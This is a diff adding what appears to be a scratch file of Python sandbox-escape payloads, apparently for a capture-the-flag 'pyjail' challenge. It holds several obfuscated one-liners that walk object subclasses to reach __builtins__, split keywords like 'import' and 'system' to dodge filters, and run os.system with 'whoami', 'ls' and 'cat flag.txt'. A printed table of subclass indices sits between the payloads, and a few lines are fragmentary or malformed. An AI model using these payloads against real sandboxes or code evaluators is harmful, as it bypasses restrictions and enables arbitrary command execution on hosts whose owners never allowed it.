@@ -1,0 +1,142 @@
+().__class__.__mro__[1].__subclasses__()[157]()._module.__builtins__['__'+'imp' + 'ort' +'__']('o' + 's').__dict__['sys' + 'tem']('whoami')
+import os; os.
+
+print(().__class__.__mro__[1].__subclasses__()[67])
+print(len(().__class__.__mro__[1].__subclasses__()))
+
+
+0 <class 'list'>
+1 <class 'generator'>
+2 <class 'BaseException'>
+3 <class 'collections.abc.Hashable'>
+4 <class 'codecs.Codec'>
+5 <class 'dict_itemiterator'>
+6 <class 'range'>
+7 <class '_frozen_importlib._ModuleLock'>
+8 <class 'dict_items'>
+9 <class '_thread.RLock'>
+10 <class '_thread._local'>
+11 <class 'dict'>
+12 <class 'ellipsis'>
+13 <class '_io._BytesIOBuffer'>
+14 <class 'os._DummyDirEntry'>
+15 <class 'str'>
+16 <class 'tuple'>
+17 <class 'tuple_iterator'>
+18 <class 'enumerate'>
+19 <class 'classmethod_descriptor'>
+20 <class 'complex'>
+21 <class 'traceback'>
+22 <class 'weakcallableproxy'>
+23 <class 'dict_keys'>
+24 <class 'dict_keyiterator'>
+25 <class 'dict_valueiterator'>
+26 <class 'codecs.StreamReaderWriter'>
+27 <class 'bytearray_iterator'>
+28 <class 'classmethod'>
+29 <class '_thread.lock'>
+30 <class 'odict_iterator'>
+31 <class 'fieldnameiterator'>
+32 <class 'set'>
+33 <class 'NotImplementedType'>
+34 <class 'dict_values'>
+35 <class '_frozen_importlib._DummyModuleLock'>
+36 <class '_io.IncrementalNewlineDecoder'>
+37 <class 'int'>
+38 <class 'collections.abc.Iterable'>
+39 <class 'callable_iterator'>
+40 <class 'collections.abc.Container'>
+41 <class 'collections.abc.Awaitable'>
+42 <class '_frozen_importlib.BuiltinImporter'>
+43 <class 'codecs.IncrementalEncoder'>
+44 <class '_sitebuiltins.Quitter'>
+45 <class 'module'>
+46 <class 'member_descriptor'>
+47 <class 'mappingproxy'>
+48 <class 'cell'>
+49 <class 'filter'>
+50 <class '_frozen_importlib_external.PathFinder'>
+51 <class '_frozen_importlib_external.FileLoader'>
+52 <class 'staticmethod'>
+53 <class 'bytes'>
+54 <class '_frozen_importlib._installed_safely'>
+55 <class 'formatteriterator'>
+56 <class 'frozenset'>
+57 <class 'PyCapsule'>
+58 <class '_frozen_importlib_external.FileFinder'>
+59 <class '_weakrefset.WeakSet'>
+60 <class 'NoneType'>
+61 <class 'iterator'>
+62 <class 'posix.ScandirIterator'>
+63 <class '_sitebuiltins._Helper'>
+64 <class '_frozen_importlib._ModuleLockManager'>
+65 <class 'collections.abc.Sized'>
+66 <class 'coroutine_wrapper'>
+67 <class '_sitebuiltins._Printer'>
+68 <class 'method'>
+69 <class '_frozen_importlib_external.WindowsRegistryFinder'>
+70 <class 'zipimport.zipimporter'>
+71 <class 'bytearray'>
+72 <class 'builtin_function_or_method'>
+73 <class 'float'>
+74 <class 'super'>
+75 <class 'os._wrap_close'>
+76 <class '_frozen_importlib_external._NamespacePath'>
+77 <class 'set_iterator'>
+78 <class 'range_iterator'>
+79 <class 'memoryview'>
+80 <class 'collections.abc.Callable'>
+81 <class '_frozen_importlib_external._LoaderBasics'>
+82 <class 'managedbuffer'>
+83 <class 'type'>
+84 <class 'coroutine'>
+85 <class 'collections.abc.AsyncIterable'>
+86 <class 'list_reverseiterator'>
+87 <class 'bytes_iterator'>
+88 <class 'getset_descriptor'>
+89 <class 'map'>
+90 <class 'function'>
+91 <class 'frame'>
+92 <class 'wrapper_descriptor'>
+93 <class 'property'>
+94 <class 'instancemethod'>
+95 <class 'zip'>
+96 <class 'weakref'>
+97 <class '_weakrefset._IterationGuard'>
+98 <class 'types.SimpleNamespace'>
+99 <class 'codecs.IncrementalDecoder'>
+100 <class '_frozen_importlib._ImportLockContext'>
+101 <class 'abc.ABC'>
+102 <class '_frozen_importlib.FrozenImporter'>
+103 <class 'str_iterator'>
+104 <class '_frozen_importlib_external._NamespaceLoader'>
+105 <class 'slice'>
+106 <class 'longrange_iterator'>
+107 <class 'moduledef'>
+108 <class 'method-wrapper'>
+109 <class '_io._IOBase'>
+110 <class 'EncodingMap'>
+111 <class '_frozen_importlib._ManageReload'>
+112 <class 'posix.DirEntry'>
+113 <class '_thread._localdummy'>
+114 <class 'list_iterator'>
+115 <class 'stderrprinter'>
+116 <class 'codecs.StreamRecoder'>
+117 <class '_frozen_importlib.ModuleSpec'>
+118 <class 'reversed'>
+119 <class 'method_descriptor'>
+120 <class 'code'>
+121 <class 'weakproxy'>
+
+
+().class.bases[0].subclasses()[59].init.func_globals['linecache'].dict['o'+'s'].dict'sy'+'stem'
+
+
+__builtins__.__dict__['__imp' + 'ort__']('o' + 's').__dict__['system']('cat flag.txt')
+
+from base64 import b64decode; __builtins__.__dict__['__import__']("os").system("ls")
+
+import flag.txt
+
+__builtins__.__dict__['__import__']("os").system("ls")
+
